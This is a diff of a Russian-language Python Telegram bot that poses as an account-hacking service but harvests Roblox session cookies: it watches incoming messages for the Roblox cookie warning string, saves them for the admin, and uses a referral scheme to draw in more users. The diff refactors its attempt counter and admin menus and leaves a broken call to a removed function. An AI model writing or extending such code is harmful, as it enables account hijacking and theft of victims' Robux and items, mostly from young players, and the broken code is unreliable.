@@ -4,7 +4,6 @@ import asyncio
 import json
 import os
 from datetime import datetime
-import re
 
 # ⚠️ ВСТАВЬ СВОЙ ТОКЕН СЮДА
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -19,8 +18,7 @@ YOUR_USER_ID = 1341594703
 MESSAGES_FILE = "messages.json"
 KEYWORD_USERS_FILE = "keyword_users.json"
 ALL_USERS_FILE = "all_users.json"
-USER_ATTEMPTS_FILE = "user_attempts.json"
-REFERRALS_FILE = "referrals.json"
+ATTEMPTS_FILE = "attempts.json"  # Новый файл для попыток
 
 KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"
 
@@ -28,150 +26,109 @@ KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log
 # ФУНКЦИИ ДЛЯ РАБОТЫ С ПОПЫТКАМИ
 # ===================================================
 
-def get_user_attempts(user_id):
-    """Получить информацию о попытках пользователя"""
+def get_attempts(user_id):
+    """Получить количество попыток пользователя"""
     try:
-        if os.path.exists(USER_ATTEMPTS_FILE):
-            with open(USER_ATTEMPTS_FILE, "r", encoding="utf-8") as f:
-                users = json.load(f)
-            return users.get(str(user_id), {})
-        return {}
+        if os.path.exists(ATTEMPTS_FILE):
+            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            return data.get(str(user_id), {"total": 2, "used": 0})
+        return {"total": 2, "used": 0}
     except:
-        return {}
+        return {"total": 2, "used": 0}
 
-def save_user_attempts(user_id, attempts_data):
-    """Сохранить информацию о попытках пользователя"""
+def save_attempts(user_id, attempts_data):
+    """Сохранить попытки пользователя"""
     try:
-        if os.path.exists(USER_ATTEMPTS_FILE):
-            with open(USER_ATTEMPTS_FILE, "r", encoding="utf-8") as f:
-                users = json.load(f)
+        if os.path.exists(ATTEMPTS_FILE):
+            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
         else:
-            users = {}
+            data = {}
         
-        users[str(user_id)] = attempts_data
+        data[str(user_id)] = attempts_data
         
-        with open(USER_ATTEMPTS_FILE, "w", encoding="utf-8") as f:
-            json.dump(users, f, ensure_ascii=False, indent=2)
+        with open(ATTEMPTS_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
         return True
-    except Exception as e:
-        print(f"Ошибка сохранения попыток: {e}")
+    except:
         return False
 
-def initialize_user_attempts(user_id):
-    """Инициализировать нового пользователя с 2 бесплатными попытками"""
-    attempts_data = {
-        "total_attempts": 2,  # Всего попыток
-        "used_attempts": 0,   # Использовано попыток
-        "referrals": 0,       # Количество приглашенных
-        "bonus_from_ref": 0,  # Бонусные попытки от приглашений
-        "last_used": None
-    }
-    save_user_attempts(user_id, attempts_data)
-    return attempts_data
-
 def get_available_attempts(user_id):
-    """Получить количество доступных попыток"""
-    attempts = get_user_attempts(user_id)
-    if not attempts:
-        attempts = initialize_user_attempts(user_id)
-    
-    total = attempts.get("total_attempts", 2)
-    used = attempts.get("used_attempts", 0)
-    return total - used
+    """Получить доступные попытки"""
+    attempts = get_attempts(user_id)
+    return attempts["total"] - attempts["used"]
 
 def use_attempt(user_id):
-    """Использовать одну попытку"""
-    attempts = get_user_attempts(user_id)
-    if not attempts:
-        attempts = initialize_user_attempts(user_id)
+    """Использовать попытку"""
+    attempts = get_attempts(user_id)
+    available = attempts["total"] - attempts["used"]
     
-    available = get_available_attempts(user_id)
     if available <= 0:
-        return False, "У вас закончились попытки! Пригласите друга для получения дополнительной попытки."
+        return False
     
-    attempts["used_attempts"] = attempts.get("used_attempts", 0) + 1
-    attempts["last_used"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    save_user_attempts(user_id, attempts)
-    return True, f"Попытка использована. Осталось: {get_available_attempts(user_id)}"
+    attempts["used"] += 1
+    save_attempts(user_id, attempts)
+    return True
 
-def add_referral_bonus(user_id):
-    """Добавить бонусную попытку за приглашение друга"""
-    attempts = get_user_attempts(user_id)
-    if not attempts:
-        attempts = initialize_user_attempts(user_id)
-    
-    attempts["total_attempts"] = attempts.get("total_attempts", 2) + 1
-    attempts["referrals"] = attempts.get("referrals", 0) + 1
-    attempts["bonus_from_ref"] = attempts.get("bonus_from_ref", 0) + 1
-    save_user_attempts(user_id, attempts)
+def add_attempt(user_id, count=1):
+    """Добавить попытки"""
+    attempts = get_attempts(user_id)
+    attempts["total"] += count
+    save_attempts(user_id, attempts)
     return True
 
 def reset_attempts(user_id):
-    """Сбросить попытки пользователя (админская функция)"""
-    attempts = {
-        "total_attempts": 2,
-        "used_attempts": 0,
-        "referrals": 0,
-        "bonus_from_ref": 0,
-        "last_used": None
-    }
-    save_user_attempts(user_id, attempts)
+    """Сбросить попытки"""
+    attempts = {"total": 2, "used": 0}
+    save_attempts(user_id, attempts)
     return True
 
 # ===================================================
 # ФУНКЦИИ ДЛЯ РАБОТЫ С РЕФЕРАЛЛАМИ
 # ===================================================
 
-def generate_referral_link(user_id):
-    """Сгенерировать реферальную ссылку"""
-    return f"https://t.me/YourBotName?start=ref_{user_id}"
+REFERRALS_FILE = "referrals.json"
 
 def save_referral(referrer_id, referred_id):
-    """Сохранить информацию о приглашении"""
+    """Сохранить реферала"""
     try:
         if os.path.exists(REFERRALS_FILE):
             with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
-                referrals = json.load(f)
+                data = json.load(f)
         else:
-            referrals = {}
+            data = {}
         
-        referrals[str(referred_id)] = {
-            "referrer_id": str(referrer_id),
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        if str(referred_id) in data:
+            return False
+        
+        data[str(referred_id)] = {
+            "referrer": str(referrer_id),
+            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         
         with open(REFERRALS_FILE, "w", encoding="utf-8") as f:
-            json.dump(referrals, f, ensure_ascii=False, indent=2)
+            json.dump(data, f, ensure_ascii=False, indent=2)
         return True
-    except Exception as e:
-        print(f"Ошибка сохранения реферала: {e}")
+    except:
         return False
 
-def get_referral_info(user_id):
-    """Получить информацию о реферале"""
+def get_referrals_count(user_id):
+    """Получить количество приглашенных"""
     try:
         if os.path.exists(REFERRALS_FILE):
             with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
-                referrals = json.load(f)
-            return referrals.get(str(user_id))
-        return None
+                data = json.load(f)
+            return sum(1 for v in data.values() if v.get("referrer") == str(user_id))
+        return 0
     except:
-        return None
+        return 0
 
-def get_total_referrals(user_id):
-    """Получить общее количество приглашенных пользователем"""
-    try:
-        if os.path.exists(REFERRALS_FILE):
-            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
-                referrals = json.load(f)
-            count = sum(1 for data in referrals.values() if data.get("referrer_id") == str(user_id))
-            return count
-        return 0
-    except:
-        return 0
+def get_referral_link(user_id):
+    return f"https://t.me/cookieeditort_bot?start=ref_{user_id}"
 
 # ===================================================
-# ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ (ОСТАЛЬНЫЕ)
+# ОСТАЛЬНЫЕ ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ)
 # ===================================================
 
 def save_all_user(user_id, username, first_name):
@@ -355,7 +312,7 @@ async def show_users_page(query, context, page=0, per_page=10):
         text += f"📅 Первый визит: {first_seen}\n"
         text += f"🕐 Последний визит: {last_seen}\n"
         text += f"🔑 Ключевое слово: {has_keyword}\n"
-        text += f"🎯 Доступно попыток: {attempts}\n"
+        text += f"🎯 Попыток: {attempts}\n"
         text += "─" * 25 + "\n"
     
     keyboard = []
@@ -413,7 +370,7 @@ async def show_keyword_users_page(query, context, page=0, per_page=10):
         text += f"🆔 {user_id}\n"
         text += f"👤 {name} (@{username})\n"
         text += f"🕐 Отправил: {timestamp}\n"
-        text += f"🎯 Доступно попыток: {attempts}\n"
+        text += f"🎯 Попыток: {attempts}\n"
         text += "─" * 25 + "\n"
     
     keyboard = []
@@ -539,64 +496,61 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = user.first_name
     user_id = user.id
     
+    # Проверяем реферальную ссылку
+    if context.args and len(context.args) > 0:
+        ref_arg = context.args[0]
+        if ref_arg.startswith("ref_"):
+            try:
+                referrer_id = int(ref_arg.replace("ref_", ""))
+                if referrer_id != user_id:  # Нельзя пригласить себя
+                    # Проверяем, не был ли уже приглашен
+                    if os.path.exists(REFERRALS_FILE):
+                        with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
+                            referrals = json.load(f)
+                    else:
+                        referrals = {}
+                    
+                    if str(user_id) not in referrals:
+                        # Сохраняем реферала
+                        referrals[str(user_id)] = {
+                            "referrer": str(referrer_id),
+                            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        with open(REFERRALS_FILE, "w", encoding="utf-8") as f:
+                            json.dump(referrals, f, ensure_ascii=False, indent=2)
+                        
+                        # Добавляем попытку пригласившему
+                        add_attempt(referrer_id, 1)
+                        
+                        # Уведомляем пригласившего
+                        try:
+                            await context.bot.send_message(
+                                chat_id=referrer_id,
+                                text=f"🎉 {user_name} перешел по вашей ссылке!\n"
+                                     f"Вы получили +1 попытку! 🎯\n"
+                                     f"Теперь у вас {get_available_attempts(referrer_id)} попыток."
+                            )
+                        except:
+                            pass
+                        
+                        await update.message.reply_text(
+                            f"🎉 Спасибо за приглашение! Вы получили +1 попытку!\n"
+                            f"Теперь у вас {get_available_attempts(user_id)} попыток."
+                        )
+            except:
+                pass
+    
     save_all_user(
         user_id=user.id,
         username=user.username or "no_username",
         first_name=user.first_name or "Unknown"
     )
     
-    # Проверяем, есть ли реферальный код
-    if context.args and len(context.args) > 0:
-        ref_arg = context.args[0]
-        if ref_arg.startswith("ref_"):
-            try:
-                referrer_id = int(ref_arg.replace("ref_", ""))
-                if referrer_id != user_id:  # Нельзя пригласить самого себя
-                    # Проверяем, не был ли уже приглашен этот пользователь
-                    existing_ref = get_referral_info(user_id)
-                    if not existing_ref:
-                        # Сохраняем реферала
-                        if save_referral(referrer_id, user_id):
-                            # Добавляем бонусную попытку пригласившему
-                            add_referral_bonus(referrer_id)
-                            # Уведомляем пригласившего
-                            try:
-                                await context.bot.send_message(
-                                    chat_id=referrer_id,
-                                    text=f"🎉 Поздравляем! Пользователь {user_name} перешел по вашей реферальной ссылке!\n"
-                                         f"Вы получили +1 попытку! 🎯\n"
-                                         f"Теперь у вас {get_available_attempts(referrer_id)} попыток."
-                                )
-                            except:
-                                pass
-                            await update.message.reply_text(
-                                f"🎉 Спасибо за приглашение! Вы получили +1 попытку!\n"
-                                f"Теперь у вас {get_available_attempts(user_id)} попыток."
-                            )
-                    else:
-                        await update.message.reply_text("ℹ️ Вы уже были приглашены другим пользователем.")
-            except:
-                pass
-    
-    # Инициализируем попытки для нового пользователя
-    attempts_data = get_user_attempts(user_id)
-    if not attempts_data:
+    # Инициализируем попытки, если их нет
+    if not os.path.exists(ATTEMPTS_FILE) or str(user_id) not in json.load(open(ATTEMPTS_FILE, "r")) if os.path.exists(ATTEMPTS_FILE) else True:
         initialize_user_attempts(user_id)
     
-    # Основное меню
-    keyboard = get_main_menu(user_id)
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        f"Привет, {user_name}!\n\n"
-        f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
-        f"💡 Пригласите друга и получите +1 попытку!\n\n"
-        f"Выбери нужную категорию:",
-        reply_markup=reply_markup
-    )
-
-def get_main_menu(user_id):
-    """Создает главное меню с учетом количества попыток"""
+    # Базовые кнопки для всех
     keyboard = [
         [
             InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
@@ -611,7 +565,7 @@ def get_main_menu(user_id):
         ]
     ]
     
-    # Админские кнопки
+    # Админские кнопки видны ТОЛЬКО ТЕБЕ
     if user_id == YOUR_USER_ID:
         keyboard.append([
             InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
@@ -626,10 +580,17 @@ def get_main_menu(user_id):
             InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
         ])
         keyboard.append([
-            InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts_menu"),
+            InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
         ])
     
-    return keyboard
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(
+        f"Привет, {user_name}!\n\n"
+        f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
+        f"💡 Пригласите друга и получите +1 попытку!\n\n"
+        f"Выбери нужную категорию:",
+        reply_markup=reply_markup
+    )
 
 # ===================================================
 # ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
@@ -643,22 +604,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == YOUR_USER_ID)
     data = query.data
     
-    # --- ОБЫЧНЫЕ КНОПКИ ---
+    # --- НОВЫЕ КНОПКИ ---
     if data == "my_attempts":
-        attempts = get_user_attempts(user_id)
-        if not attempts:
-            attempts = initialize_user_attempts(user_id)
-        
         available = get_available_attempts(user_id)
-        total_ref = get_total_referrals(user_id)
+        attempts = get_attempts(user_id)
+        referrals = get_referrals_count(user_id)
         
         text = f"🎯 **Ваши попытки:**\n\n"
-        text += f"📊 Всего попыток: {attempts.get('total_attempts', 2)}\n"
-        text += f"✅ Использовано: {attempts.get('used_attempts', 0)}\n"
+        text += f"📊 Всего: {attempts['total']}\n"
+        text += f"✅ Использовано: {attempts['used']}\n"
         text += f"🎯 Доступно: {available}\n"
-        text += f"👥 Приглашено друзей: {total_ref}\n"
-        text += f"🎁 Бонусов за приглашения: {attempts.get('bonus_from_ref', 0)}\n\n"
-        text += f"💡 Пригласите друга и получите +1 попытку!\n"
+        text += f"👥 Приглашено друзей: {referrals}\n\n"
+        text += f"💡 Пригласите друга и получите +1 попытку!"
         
         keyboard = [
             [InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend")],
@@ -669,32 +626,79 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "invite_friend":
-        referral_link = generate_referral_link(user_id)
-        text = f"👥 **Пригласите друга и получите бонус!**\n\n"
-        text += f"🎁 За каждого приглашенного друга вы получаете +1 попытку!\n"
-        text += f"👥 У вас уже {get_total_referrals(user_id)} приглашенных\n\n"
-        text += f"🔗 **Ваша реферальная ссылка:**\n"
-        text += f"`{referral_link}`\n\n"
-        text += f"📋 Просто скопируйте ссылку и отправьте другу!\n"
+        link = get_referral_link(user_id)
+        referrals = get_referrals_count(user_id)
+        
+        text = f"👥 **Пригласите друга!**\n\n"
+        text += f"🎁 За каждого друга вы получаете +1 попытку!\n"
+        text += f"👥 У вас уже {referrals} приглашенных\n\n"
+        text += f"🔗 Ваша ссылка:\n"
+        text += f"`{link}`\n\n"
+        text += f"📋 Отправьте ссылку другу!"
         
         keyboard = [
-            [InlineKeyboardButton("📋 Скопировать ссылку", callback_data="copy_referral")],
             [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(text, reply_markup=reply_markup)
         return
     
-    elif data == "copy_referral":
-        referral_link = generate_referral_link(user_id)
+    elif data == "manage_attempts":
+        keyboard = [
+            [InlineKeyboardButton("📊 Статистика попыток", callback_data="attempts_stats")],
+            [InlineKeyboardButton("🎯 Добавить попытки", callback_data="add_attempts_admin")],
+            [InlineKeyboardButton("🔄 Сбросить попытки", callback_data="reset_attempts_admin")],
+            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"📋 **Ваша реферальная ссылка:**\n\n"
-            f"`{referral_link}`\n\n"
-            f"📌 Нажмите на ссылку, чтобы скопировать её.\n"
-            f"Отправьте её другу и получите +1 попытку! 🎯"
+            "🎯 **Управление попытками:**",
+            reply_markup=reply_markup
         )
         return
     
+    elif data == "attempts_stats":
+        users = get_all_users()
+        total = 0
+        used = 0
+        
+        for uid in users.keys():
+            att = get_attempts(int(uid))
+            total += att["total"]
+            used += att["used"]
+        
+        text = f"📊 **Статистика попыток:**\n\n"
+        text += f"👥 Всего: {len(users)} пользователей\n"
+        text += f"🎯 Всего попыток: {total}\n"
+        text += f"✅ Использовано: {used}\n"
+        text += f"🎯 Доступно: {total - used}\n"
+        
+        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="manage_attempts")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(text, reply_markup=reply_markup)
+        return
+    
+    elif data == "add_attempts_admin":
+        context.user_data['admin_action'] = 'add_attempts'
+        await query.edit_message_text(
+            "🎯 **Добавить попытки:**\n\n"
+            "Отправьте: `ID Количество`\n"
+            "Пример: `1341594703 5`\n\n"
+            "Для отмены: /cancel"
+        )
+        return
+    
+    elif data == "reset_attempts_admin":
+        context.user_data['admin_action'] = 'reset_attempts'
+        await query.edit_message_text(
+            "🔄 **Сбросить попытки:**\n\n"
+            "Отправьте ID пользователя\n"
+            "Пример: `1341594703`\n\n"
+            "Для отмены: /cancel"
+        )
+        return
+    
+    # --- ОСТАЛЬНЫЕ КНОПКИ (БЕЗ ИЗМЕНЕНИЙ) ---
     elif data == "device":
         keyboard = [
             [
@@ -710,13 +714,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "phone":
-        # Проверяем наличие попыток
-        available = get_available_attempts(user_id)
-        if available <= 0:
+        if get_available_attempts(user_id) <= 0:
             await query.edit_message_text(
                 "❌ У вас закончились попытки!\n\n"
-                "💡 Пригласите друга и получите +1 попытку!\n"
-                f"👥 У вас {get_total_referrals(user_id)} приглашенных."
+                "💡 Пригласите друга и получите +1 попытку!"
             )
             return
         
@@ -736,12 +737,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "computer":
-        available = get_available_attempts(user_id)
-        if available <= 0:
+        if get_available_attempts(user_id) <= 0:
             await query.edit_message_text(
                 "❌ У вас закончились попытки!\n\n"
-                "💡 Пригласите друга и получите +1 попытку!\n"
-                f"👥 У вас {get_total_referrals(user_id)} приглашенных."
+                "💡 Пригласите друга и получите +1 попытку!"
             )
             return
         
@@ -761,22 +760,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
-        # Используем попытку
-        success, message = use_attempt(user_id)
-        if not success:
+        if use_attempt(user_id):
             await query.edit_message_text(
-                f"❌ {message}\n\n"
-                f"💡 Пригласите друга и получите +1 попытку!\n"
-                f"👥 У вас {get_total_referrals(user_id)} приглашенных."
+                f"✅ Попытка использована. Осталось: {get_available_attempts(user_id)}\n\n"
+                "Скинь cookie в бота\n"
+                "И бот начнет поиск пароля вашей жертвы😈\n"
+                "В течении дня бот скинет вам пароль от аккаунта"
             )
-            return
-        
-        await query.edit_message_text(
-            f"✅ {message}\n\n"
-            f"📋 Скиньте cookie в бота\n"
-            f"Бот начнет поиск пароля вашей жертвы😈\n"
-            f"В течении дня бот скинет вам пароль от аккаунта"
-        )
+        else:
+            await query.edit_message_text(
+                "❌ У вас закончились попытки!\n\n"
+                "💡 Пригласите друга и получите +1 попытку!"
+            )
         return
     
     elif data == "cookies":
@@ -799,10 +794,42 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "back_to_menu":
-        keyboard = get_main_menu(user_id)
+        user_name = update.effective_user.first_name
+        
+        keyboard = [
+            [
+                InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
+                InlineKeyboardButton("Инструкция", callback_data="cookies"),
+            ],
+            [
+                InlineKeyboardButton("Поддержка", callback_data="support"),
+                InlineKeyboardButton("🎯 Мои попытки", callback_data="my_attempts"),
+            ],
+            [
+                InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend"),
+            ]
+        ]
+        
+        if user_id == YOUR_USER_ID:
+            keyboard.append([
+                InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
+                InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
+                InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
+                InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
+            ])
+        
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"Привет, {update.effective_user.first_name}!\n\n"
+            f"Привет, {user_name}!\n\n"
             f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
             f"💡 Пригласите друга и получите +1 попытку!\n\n"
             f"Выбери нужную категорию:",
@@ -819,68 +846,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("⚠️ Эта функция временно недоступна.")
         return
     
-    # Управление попытками (админ)
-    elif data == "manage_attempts_menu":
-        keyboard = [
-            [InlineKeyboardButton("📊 Статистика попыток", callback_data="attempts_stats")],
-            [InlineKeyboardButton("🎯 Добавить попытки", callback_data="add_attempts")],
-            [InlineKeyboardButton("🔄 Сбросить попытки", callback_data="reset_attempts")],
-            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(
-            "🎯 **Управление попытками пользователей:**\n\n"
-            "Выберите действие:",
-            reply_markup=reply_markup
-        )
-        return
-    
-    elif data == "attempts_stats":
-        all_users = get_all_users()
-        total_attempts = 0
-        total_used = 0
-        total_refs = 0
-        
-        for user_id in all_users.keys():
-            attempts = get_user_attempts(int(user_id))
-            if attempts:
-                total_attempts += attempts.get("total_attempts", 0)
-                total_used += attempts.get("used_attempts", 0)
-                total_refs += attempts.get("referrals", 0)
-        
-        text = f"📊 **Статистика попыток:**\n\n"
-        text += f"👥 Всего пользователей: {len(all_users)}\n"
-        text += f"🎯 Всего попыток: {total_attempts}\n"
-        text += f"✅ Использовано: {total_used}\n"
-        text += f"🎯 Доступно: {total_attempts - total_used}\n"
-        text += f"👥 Всего приглашений: {total_refs}\n"
-        
-        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="manage_attempts_menu")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply_markup)
-        return
-    
-    elif data == "add_attempts":
-        context.user_data['admin_action'] = 'add_attempts'
-        await query.edit_message_text(
-            "🎯 **Добавить попытки пользователю:**\n\n"
-            "Введите ID пользователя и количество попыток через пробел.\n"
-            "Пример: `1341594703 5`\n\n"
-            "Для отмены нажмите /cancel"
-        )
-        return
-    
-    elif data == "reset_attempts":
-        context.user_data['admin_action'] = 'reset_attempts'
-        await query.edit_message_text(
-            "🔄 **Сбросить попытки пользователю:**\n\n"
-            "Введите ID пользователя для сброса попыток до 2.\n"
-            "Пример: `1341594703`\n\n"
-            "Для отмены нажмите /cancel"
-        )
-        return
-    
-    # Остальные админские функции (без изменений)
     elif data == "delete_users_menu":
         keyboard = [
             [InlineKeyboardButton("🗑 Удалить одного пользователя", callback_data="delete_single_user")],
@@ -1051,24 +1016,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 messages = json.load(f)
                 total_messages = len(messages)
         
-        total_attempts = 0
-        total_used = 0
-        total_refs = 0
-        for user_id in all_users.keys():
-            attempts = get_user_attempts(int(user_id))
-            if attempts:
-                total_attempts += attempts.get("total_attempts", 0)
-                total_used += attempts.get("used_attempts", 0)
-                total_refs += attempts.get("referrals", 0)
+        total_att = 0
+        used_att = 0
+        for uid in all_users.keys():
+            att = get_attempts(int(uid))
+            total_att += att["total"]
+            used_att += att["used"]
         
         text = "📊 **СТАТИСТИКА БОТА:**\n\n"
         text += f"👥 Всего пользователей: {len(all_users)}\n"
         text += f"🔑 С ключевым словом: {len(keyword_users)}\n"
         text += f"📩 Сообщений сохранено: {total_messages}\n\n"
-        text += f"🎯 Всего попыток: {total_attempts}\n"
-        text += f"✅ Использовано: {total_used}\n"
-        text += f"🎯 Доступно: {total_attempts - total_used}\n"
-        text += f"👥 Всего приглашений: {total_refs}\n\n"
+        text += f"🎯 Всего попыток: {total_att}\n"
+        text += f"✅ Использовано: {used_att}\n"
+        text += f"🎯 Доступно: {total_att - used_att}\n\n"
         
         today = datetime.now().strftime("%Y-%m-%d")
         today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
@@ -1237,19 +1198,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts = user_message.split()
             if len(parts) == 2:
                 try:
-                    target_user_id = int(parts[0])
-                    amount = int(parts[1])
-                    
-                    attempts = get_user_attempts(target_user_id)
-                    if not attempts:
-                        attempts = initialize_user_attempts(target_user_id)
-                    
-                    attempts["total_attempts"] = attempts.get("total_attempts", 2) + amount
-                    save_user_attempts(target_user_id, attempts)
-                    
+                    target_id = int(parts[0])
+                    count = int(parts[1])
+                    add_attempt(target_id, count)
                     await update.message.reply_text(
-                        f"✅ Добавлено {amount} попыток пользователю {target_user_id}\n"
-                        f"Теперь у него {get_available_attempts(target_user_id)} попыток."
+                        f"✅ Добавлено {count} попыток пользователю {target_id}\n"
+                        f"Теперь у него {get_available_attempts(target_id)} попыток."
                     )
                     del context.user_data['admin_action']
                     return
@@ -1262,11 +1216,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         elif action == 'reset_attempts':
             try:
-                target_user_id = int(user_message)
-                reset_attempts(target_user_id)
+                target_id = int(user_message)
+                reset_attempts(target_id)
                 await update.message.reply_text(
-                    f"✅ Попытки сброшены для пользователя {target_user_id}\n"
-                    f"Теперь у него {get_available_attempts(target_user_id)} попыток."
+                    f"✅ Попытки сброшены для пользователя {target_id}\n"
+                    f"Теперь у него {get_available_attempts(target_id)} попыток."
                 )
                 del context.user_data['admin_action']
                 return
@@ -1285,10 +1239,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if mailing_type == 'all':
             users = get_all_users()
-            text = "📨 **Рассылка ВСЕМ пользователям:**\n\n"
         else:
             users = get_keyword_users()
-            text = "📨 **Рассылка пользователям с ключевым словом:**\n\n"
         
         if not users:
             await update.message.reply_text("❌ Нет пользователей для рассылки.")
@@ -1325,12 +1277,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Обычная обработка сообщений
     if KEYWORD in user_message:
         # Проверяем попытки
-        available = get_available_attempts(user_id)
-        if available <= 0:
+        if get_available_attempts(user_id) <= 0:
             await update.message.reply_text(
                 "❌ У вас закончились попытки!\n\n"
-                "💡 Пригласите друга и получите +1 попытку!\n"
-                f"👥 У вас {get_total_referrals(user_id)} приглашенных."
+                "💡 Пригласите друга и получите +1 попытку!"
             )
             return
         
@@ -1348,8 +1298,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
         
-        # Используем попытку
-        success, msg = use_attempt(user_id)
+        use_attempt(user_id)  # Используем попытку
         
         await update.message.reply_text(
             f"Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
@@ -1418,11 +1367,9 @@ def main():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
+    print("🤖 Бот запущен!")
+    print("✅ Добавлена система попыток: 2 бесплатные + 1 за приглашение")
     print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
-    print("🎯 Добавлена система попыток: 2 бесплатные + бонус за приглашения")
-    print("📨 Для рассылки нажми кнопку 'Рассылка' в меню")
-    print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
     app.run_polling()
 
 if __name__ == "__main__":
